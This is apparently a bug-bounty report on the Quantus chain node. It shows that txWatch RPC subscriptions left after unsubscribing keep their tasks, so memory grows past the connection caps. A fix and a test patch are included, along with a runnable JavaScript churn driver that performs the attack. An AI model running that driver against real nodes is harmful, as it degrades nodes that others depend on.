# 88386 bc medium unsubscribe lifecycle bug bypasses txwatch rpc caps and increases full node resource use by 121&#x20;

**Submitted on Aug 12th 2026 at 23:41:46 UTC by @Porcupine17126 for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88386
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Summary

`txWatch_watchAddress` spawns one Tokio task and one broadcast receiver per accepted subscription. The task waits only on `listener_rx.recv().await`; it checks `sink.is_closed()` only after a transfer is broadcast.

When a client invokes `txWatch_unwatchAddress` or disconnects, closing the JSON-RPC `SubscriptionSink` does not wake `broadcast::Receiver::recv()`. The task therefore remains allocated until a later decoded transfer reaches the broadcast channel. Reconnecting lets the same unauthenticated client repeat the process, so `--rpc-max-connections` and `--rpc-max-subscriptions-per-connection` limit concurrent clients but do not bound cumulative retained tasks.

The runnable PoC configures the server to allow only one connection at a time, explicitly unsubscribes every subscription, and disconnects before opening the next connection. In 2.93 seconds, 64 sequential connection cycles retain 16,384 closed subscriptions and increase the in-process RPC server's RSS from 16,089,088 bytes to 46,383,104 bytes: **+188.3%**. This proves linear cumulative retention beyond the configured limits. An actual full-node process measurement is provided below.

## Severity and in-scope impact

* Suggested severity: **Medium**
* Asset: `https://github.com/immunefi-team/audit-comp-quantus-chain`
* Commit tested: `3b243b870a5442a6e5f443056f67bbba87d472f5`
* Exact listed impact: **Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours**

The attack requires no valid account, signature, on-chain transaction, fee, privileged role, secret, or guessed value. It consists only of deterministic public WebSocket RPC subscribe/unsubscribe calls. The PoC uses one concurrent connection, so its 188.3% RSS increase cannot be attributed to raising the configured connection limit.

## Production reachability

This is not an unsafe or development-only RPC. `node/src/rpc.rs` merges `TxWatch::new(pool).into_rpc()` into every full node's RPC module and explicitly classifies TxWatch as **Safe**, describing its work as bounded by the fixed broadcast capacity. Safe methods remain available when a public node denies unsafe RPC calls.

On 13 August 2026, a read-only `rpc_methods` query to Quantus's official public endpoint `https://a1-planck.quantus.cat` returned both vulnerable methods:

```
txWatch_watchAddress
txWatch_unwatchAddress
```

RPC call rate limiting is disabled by default. Default concurrent limits are 100 connections and 1,024 subscriptions per connection, but the PoC shows why even limits reduced to 1 and 256 do not cap retained tasks across connection reuse.

## Root cause

In `node/src/txwatch.rs`, lines 151-159 accept the subscription, create a broadcast receiver, and spawn a detached task:

```rust
let sink = pending.accept().await?;
let mut listener_rx = self.broadcast.subscribe();

jsonrpsee::tokio::spawn(async move {
    loop {
        match listener_rx.recv().await {
            Ok(decoded) => {
                if sink.is_closed() {
                    break;
                }
```

`jsonrpsee::SubscriptionSink` provides the cancellation-aware `closed().await` future, but this task never awaits it. Consequently:

1. The client cleanly unsubscribes or closes its connection.
2. jsonrpsee marks the sink closed and releases the active connection for reuse.
3. The detached task stays blocked in `listener_rx.recv().await` and retains its broadcast receiver, closed sink handle, target account, and future/task allocation.
4. A new connection can allocate another full set of subscriptions.
5. Repeating the cycle grows memory linearly beyond both server-level limits.

The fanout task broadcasts only decoded transfer calls. Non-transfer pool traffic does not clean the retained listeners. A later transfer wakes every retained task simultaneously, which creates an additional CPU wake-up burst before the closed tasks exit. An attacker can continuously replenish listeners between broadcasts. Accordingly, this report claims **unbounded cumulative task retention between transfer-bearing pool broadcasts**, not a permanent leak.

## Distinction from PR #630

[PR #630](https://github.com/Quantus-Network/chain/pull/630) addressed a shared live-listener pool of 32 slots and replaced it with server-level limits on active connections and active subscriptions per connection. Its stated security assumption was that those server-level limits bound `txWatch` resource use.

This report identifies a different lifecycle failure that bypasses that replacement bound. After `txWatch_unwatchAddress` or connection closure, jsonrpsee releases the active subscription and connection capacity, allowing those slots to be reused. Quantus's separately spawned task nevertheless remains blocked on `listener_rx.recv().await` and retains its receiver and task allocation. A single client can therefore reuse one connection slot repeatedly and accumulate retained tasks beyond both server-level limits.

PR #630 does not identify post-unsubscribe task retention, `SubscriptionSink::closed()`, cumulative cap reuse, or receivers surviving connection closure. The PoC specifically demonstrates this distinct state by setting `max_connections = 1`, explicitly unsubscribing every subscription, and reaching 16,384 retained receivers.

The PR #630 review discussed the resource cost of concurrently active subscriptions under the default caps. It did not identify that closed subscriptions survive after their capacity slots are released, or that one connection slot can be reused to accumulate tasks beyond those caps.

## Runnable proof of concept

Apply the `poc.patch` reproduced in the Proof of Concept section from the repository root, then run:

```bash
LIBCLANG_PATH=/Library/Developer/CommandLineTools/usr/lib \
DYLD_FALLBACK_LIBRARY_PATH=/Library/Developer/CommandLineTools/usr/lib \
SKIP_WASM_BUILD=1 \
CARGO_INCREMENTAL=0 \
CARGO_PROFILE_DEV_DEBUG=0 \
CARGO_PROFILE_TEST_DEBUG=0 \
cargo test -p quantus-node \
  txwatch::tests::unsubscribed_watchers_remain_registered_until_a_transfer_is_broadcast \
  -- --nocapture
```

The two Apple-specific library variables can be omitted on Linux when `libclang` is already discoverable.

Observed output:

```
running 1 test
baseline_rss=16089088 leaked_rss=46383104 increase=188.3% receivers=16384
test txwatch::tests::unsubscribed_watchers_remain_registered_until_a_transfer_is_broadcast ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 2.93s
```

The test also proves causality: after asserting that all 16,384 closed receivers remain, it sends one broadcast item and waits until `receiver_count()` becomes zero.

The complete `cargo test -p quantus-node -- --nocapture` suite also passes with the PoC applied: **39 passed, 0 failed**. That full-suite run independently measured 16,384 retained receivers and a 132.1% in-process RSS increase. Its relevant output is reproduced in the Proof of Concept section below.

## Full-node impact measurement

The separate `full-node-churn.js` driver was run against an unmodified `quantus-node --dev` process with Safe RPC methods, one maximum concurrent connection, and 1,024 maximum subscriptions per connection. It opens exactly one WebSocket connection at a time, creates 1,024 watchers, explicitly invokes `txWatch_unwatchAddress` for every returned subscription ID, closes the connection, and repeats. It submits no transaction.

Using Node.js **v24.5.0**, `/usr/bin/time -p` measured the full 64-cycle, 65,536-subscription churn at **2.12 seconds**. The local development node received no transfer-bearing pool submission during that interval, and the driver itself submitted no transaction.

After the node had started and its RPC was ready, macOS `footprint` reported a settled physical footprint of **71 MB**. After 64 sequential cycles (65,536 explicitly unsubscribed watchers), it reported **157 MB**, a conservative **+121.1%** increase. Ten seconds later, with the client disconnected and the node idle, the footprint remained elevated at 163 MB.

```
baseline:  Footprint: 71 MB
cycles=64 retained_candidate_tasks=65536
post-run:  Footprint: 157 MB
idle +10s: Footprint: 163 MB
increase:  (157 - 71) / 71 = 121.1%
full churn elapsed time: real 2.12 seconds
```

This is a measurement of the actual full-node process, not the minimal in-process server. On macOS, dirty anonymous pages may be compressed or paged, which makes instantaneous `ps` RSS unstable; the same process physical-footprint metric was therefore used before and after. The complete commands and raw measurements are reproduced in the Proof of Concept section below.

## Recommended remediation

Wait for sink closure and the next broadcast concurrently:

```rust
loop {
    let received = jsonrpsee::tokio::select! {
        _ = sink.closed() => break,
        received = listener_rx.recv() => received,
    };

    match received {
        // existing match arms
    }
}
```

Add a regression test which unsubscribes without sending a transfer and asserts that `broadcast.receiver_count()` promptly returns to zero.

As a cross-check, the PoC was run against this proposed `select!` change. The leak assertion failed on the first cycle with only 2 transient receivers remaining instead of 256; those tasks were already being cancelled without any transfer broadcast.

## Why server-level caps do not mitigate this

The source comment says capacity is bounded by `--rpc-max-connections` and `--rpc-max-subscriptions-per-connection`. Those limits bound active state on a connection. They do not bound tasks retained after a connection has been released. The PoC deliberately sets both limits tightly—one active connection and 256 subscriptions per connection—then reuses the single connection slot 64 times. Retained receivers reach 16,384 despite never exceeding either live limit.

## Proof of Concept

All testing was local. No load or exploit traffic was sent to the public Quantus endpoint.

### A. Exact lifecycle and causality test

{% stepper %}
{% step %}

## Check out the scoped commit

Check out scoped commit `3b243b870a5442a6e5f443056f67bbba87d472f5`.
{% endstep %}

{% step %}

## Apply the patch

Save the patch below as `poc.patch` and run:

```bash
git apply poc.patch
```

{% endstep %}

{% step %}

## Run the test

```bash
LIBCLANG_PATH=/Library/Developer/CommandLineTools/usr/lib \
DYLD_FALLBACK_LIBRARY_PATH=/Library/Developer/CommandLineTools/usr/lib \
SKIP_WASM_BUILD=1 \
CARGO_INCREMENTAL=0 \
CARGO_PROFILE_DEV_DEBUG=0 \
CARGO_PROFILE_TEST_DEBUG=0 \
cargo test -p quantus-node \
  txwatch::tests::unsubscribed_watchers_remain_registered_until_a_transfer_is_broadcast \
  -- --nocapture
```

{% endstep %}
{% endstepper %}

The test starts the real Quantus `TxWatch::into_rpc()` module over loopback WebSocket with `max_connections=1` and `max_subscriptions_per_connection=256`. It creates and explicitly unsubscribes 256 watchers over each of 64 sequential connections. It asserts all 16,384 broadcast receivers remain after the live RPC slots are reusable. Finally, one synthetic transfer broadcast reduces receiver count to zero, proving the blocked detached tasks are the cause.

### Patch

```diff
diff --git a/Cargo.lock b/Cargo.lock
index 2745282..31e9c02 100644
--- a/Cargo.lock
+++ b/Cargo.lock
@@ -7669,6 +7669,7 @@ dependencies = [
  "sp-timestamp",
  "substrate-build-script-utils",
  "substrate-frame-rpc-system",
+ "sysinfo",
  "tokio",
  "tokio-util",
  "zeroize",
diff --git a/node/Cargo.toml b/node/Cargo.toml
index 3160913..7b4a2eb 100644
--- a/node/Cargo.toml
+++ b/node/Cargo.toml
@@ -109,6 +109,8 @@ tokio-util.workspace = true
 zeroize = { workspace = true, default-features = true }
 
 [dev-dependencies]
+jsonrpsee = { features = ["ws-client"], workspace = true }
+sysinfo = "0.30.13"
 tokio = { workspace = true, features = ["macros", "rt", "time"] }
 
 [build-dependencies]
diff --git a/node/src/txwatch.rs b/node/src/txwatch.rs
index eea8839..af7cc4f 100644
--- a/node/src/txwatch.rs
+++ b/node/src/txwatch.rs
@@ -244,8 +244,14 @@ pub(crate) fn extract_transfers_to(
 #[cfg(test)]
 mod tests {
 	use super::*;
+	use jsonrpsee::{
+		core::client::SubscriptionClientT, rpc_params, server::ServerBuilder,
+		ws_client::WsClientBuilder,
+	};
 	use quantus_runtime::UNIT;
 	use sp_runtime::AccountId32;
+	use std::time::Duration;
+	use sysinfo::{get_current_pid, System};
 
 	fn merchant() -> AccountId {
 		AccountId32::from([1; 32])
@@ -437,4 +443,87 @@ mod tests {
 		assert_eq!(all[1], (other(), 20 * UNIT, None));
 		assert_eq!(all[2], (customer(), 300, None));
 	}
+
+	#[tokio::test]
+	async fn unsubscribed_watchers_remain_registered_until_a_transfer_is_broadcast() {
+		const CONNECTION_CHURN: usize = 64;
+		const SUBSCRIPTIONS_PER_CONNECTION: usize = 256;
+		const TOTAL_SUBSCRIPTIONS: usize = CONNECTION_CHURN * SUBSCRIPTIONS_PER_CONNECTION;
+
+		let (broadcast, _) = broadcast::channel(BROADCAST_CAPACITY);
+		let tx_watch = TxWatch { broadcast: broadcast.clone() };
+		let server = ServerBuilder::default()
+			.max_connections(1)
+			.max_subscriptions_per_connection(SUBSCRIPTIONS_PER_CONNECTION as u32)
+			.build("127.0.0.1:0")
+			.await
+			.unwrap();
+		let addr = server.local_addr().unwrap();
+		let handle = server.start(tx_watch.into_rpc());
+		let address = merchant().to_ss58check();
+		let pid = get_current_pid().unwrap();
+		let mut system = System::new_all();
+		let baseline_rss = system.process(pid).unwrap().memory();
+
+		for connection in 1..=CONNECTION_CHURN {
+			let client = loop {
+				match WsClientBuilder::default().build(&format!("ws://{addr}")).await {
+					Ok(client) => break client,
+					Err(_) => tokio::task::yield_now().await,
+				}
+			};
+			let mut subscriptions = Vec::with_capacity(SUBSCRIPTIONS_PER_CONNECTION);
+			for _ in 0..SUBSCRIPTIONS_PER_CONNECTION {
+				subscriptions.push(
+					client
+						.subscribe::<TransferNotification, _>(
+							"txWatch_watchAddress",
+							rpc_params![address.clone()],
+							"txWatch_unwatchAddress",
+						)
+						.await
+						.unwrap(),
+				);
+			}
+			for subscription in subscriptions {
+				subscription.unsubscribe().await.unwrap();
+			}
+			drop(client);
+			let expected = connection * SUBSCRIPTIONS_PER_CONNECTION;
+			assert_eq!(
+				broadcast.receiver_count(),
+				expected,
+				"the connection and active-subscription slots are released, but the spawned receiver remains"
+			);
+		}
+
+		tokio::time::sleep(Duration::from_millis(50)).await;
+		assert_eq!(broadcast.receiver_count(), TOTAL_SUBSCRIPTIONS);
+		system.refresh_process(pid);
+		let leaked_rss = system.process(pid).unwrap().memory();
+		let increase_percent =
+			(leaked_rss.saturating_sub(baseline_rss) as f64 * 100.0) / baseline_rss as f64;
+		println!(
+			"baseline_rss={baseline_rss} leaked_rss={leaked_rss} increase={increase_percent:.1}% receivers={}",
+			broadcast.receiver_count()
+		);
+
+		broadcast
+			.send(Arc::new(DecodedPoolTx {
+				tx_hash: "0xcleanup".into(),
+				from: None,
+				transfers: vec![(other(), 1, None)],
+			}))
+			.unwrap();
+
+		tokio::time::timeout(Duration::from_secs(1), async {
+			while broadcast.receiver_count() != 0 {
+				tokio::task::yield_now().await;
+			}
+		})
+		.await
+		.unwrap();
+
+		handle.stop().unwrap();
+	}
 }
```

### B. Actual full-node measurement

{% stepper %}
{% step %}

## Build and start an unmodified development node

```bash
cargo build -p quantus-node --bin quantus-node

target/debug/quantus-node --dev --rpc-port 9944 \
  --rpc-max-connections 1 \
  --rpc-max-subscriptions-per-connection 1024 \
  --rpc-methods safe --no-telemetry --no-prometheus
```

{% endstep %}

{% step %}

## Save the driver

Save the following as `full-node-churn.js`.

```javascript
#!/usr/bin/env node

// Local-only production-process PoC driver. It intentionally opens only one
// WebSocket connection at a time and explicitly unsubscribes every watcher.

const endpoint = process.argv[2] ?? "ws://127.0.0.1:9944";
const cycles = Number(process.argv[3] ?? 64);
const subscriptionsPerConnection = Number(process.argv[4] ?? 1024);
const address =
  process.argv[5] ?? "qzokTZkdWXxMgSXyF86ECHxG8o8yRX5ibrX2Uw8YmqkHRdj1V";

let nextId = 1;

function connect() {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(endpoint);
    ws.addEventListener("open", () => resolve(ws), { once: true });
    ws.addEventListener("error", reject, { once: true });
  });
}

function rpcClient(ws) {
  const pending = new Map();
  ws.addEventListener("message", (event) => {
    const message = JSON.parse(event.data);
    if (message.id === undefined) return;
    const waiter = pending.get(message.id);
    if (!waiter) return;
    pending.delete(message.id);
    if (message.error) waiter.reject(new Error(JSON.stringify(message.error)));
    else waiter.resolve(message.result);
  });

  return (method, params) => {
    const id = nextId++;
    const response = new Promise((resolve, reject) => {
      pending.set(id, { resolve, reject });
    });
    ws.send(JSON.stringify({ jsonrpc: "2.0", id, method, params }));
    return response;
  };
}

async function close(ws) {
  if (ws.readyState === WebSocket.CLOSED) return;
  const closed = new Promise((resolve) =>
    ws.addEventListener("close", resolve, { once: true }),
  );
  ws.close();
  await closed;
}

for (let cycle = 1; cycle <= cycles; cycle++) {
  const ws = await connect();
  const rpc = rpcClient(ws);
  const ids = [];

  for (let offset = 0; offset < subscriptionsPerConnection; offset += 128) {
    const count = Math.min(128, subscriptionsPerConnection - offset);
    ids.push(
      ...(await Promise.all(
        Array.from({ length: count }, () =>
          rpc("txWatch_watchAddress", [address]),
        ),
      )),
    );
  }

  for (let offset = 0; offset < ids.length; offset += 128) {
    await Promise.all(
      ids
        .slice(offset, offset + 128)
        .map((subscriptionId) =>
          rpc("txWatch_unwatchAddress", [subscriptionId]),
        ),
    );
  }

  await close(ws);
  if (cycle === 1 || cycle % 10 === 0 || cycle === cycles) {
    console.log(
      `cycles=${cycle} retained_candidate_tasks=${cycle * subscriptionsPerConnection}`,
    );
  }
}
```

{% endstep %}

{% step %}

## Run the driver

```bash
node full-node-churn.js ws://127.0.0.1:9944 64 1024
```

{% endstep %}
{% endstepper %}

This driver opens exactly one connection at a time and calls `txWatch_unwatchAddress` for every subscription ID. It submits no transaction.

### Full-node output

```
Full-node reproduction (macOS 15, Apple Silicon)
Commit: 3b243b870a5442a6e5f443056f67bbba87d472f5

Node command:
  target/debug/quantus-node --dev --rpc-port 9944 \
    --rpc-max-connections 1 \
    --rpc-max-subscriptions-per-connection 1024 \
    --rpc-methods safe --no-telemetry --no-prometheus

Readiness check:
  txWatch_unwatchAddress
  txWatch_watchAddress

Settled baseline, 45 seconds after process start:
  quantus-node [51243]: 64-bit    Footprint: 71 MB (16384 bytes per page)

Driver command:
  node full-node-churn.js ws://127.0.0.1:9944 64 1024

Driver output:
  cycles=1 retained_candidate_tasks=1024
  cycles=10 retained_candidate_tasks=10240
  cycles=20 retained_candidate_tasks=20480
  cycles=30 retained_candidate_tasks=30720
  cycles=40 retained_candidate_tasks=40960
  cycles=50 retained_candidate_tasks=51200
  cycles=60 retained_candidate_tasks=61440
  cycles=64 retained_candidate_tasks=65536

Immediate post-run measurement:
  quantus-node [51243]: 64-bit    Footprint: 157 MB (16384 bytes per page)
  phys_footprint: 157 MB
  phys_footprint_peak: 189 MB

Ten-second idle confirmation:
  quantus-node [51243]: 64-bit    Footprint: 163 MB (16384 bytes per page)

Conservative increase using the immediate measurement:
  (157 MB - 71 MB) / 71 MB * 100 = 121.1%

The driver held exactly one WebSocket connection at a time, explicitly called
txWatch_unwatchAddress for every returned subscription ID, and submitted no
transactions. macOS may compress or page dirty anonymous memory, so `ps` RSS
is not stable for this comparison; `footprint`'s process physical-footprint
metric is used consistently before and after.
```

### Full regression output

```
Command:
  LIBCLANG_PATH=/Library/Developer/CommandLineTools/usr/lib \
  DYLD_FALLBACK_LIBRARY_PATH=/Library/Developer/CommandLineTools/usr/lib \
  SKIP_WASM_BUILD=1 \
  CARGO_INCREMENTAL=0 \
  CARGO_PROFILE_DEV_DEBUG=0 \
  CARGO_PROFILE_TEST_DEBUG=0 \
  CARGO_BUILD_JOBS=2 \
  cargo test -p quantus-node -- --nocapture

Relevant output:
  running 39 tests
  baseline_rss=21053440 leaked_rss=48857088 increase=132.1% receivers=16384
  test txwatch::tests::unsubscribed_watchers_remain_registered_until_a_transfer_is_broadcast ... ok

  test result: ok. 39 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 3.21s

The first sandboxed invocation compiled the suite but denied the PoC's local
ephemeral socket bind (`Operation not permitted`). Re-running the identical,
already-compiled command with localhost binding allowed produced the clean
39/39 result above.
```

The full suite passes 39/39. The focused lifecycle test independently reports 16,384 retained receivers and +132.1% in-process RSS. The actual `quantus-node --dev` process rises from a settled 71 MB physical footprint to 157 MB (+121.1%) and remains 163 MB after ten idle seconds.
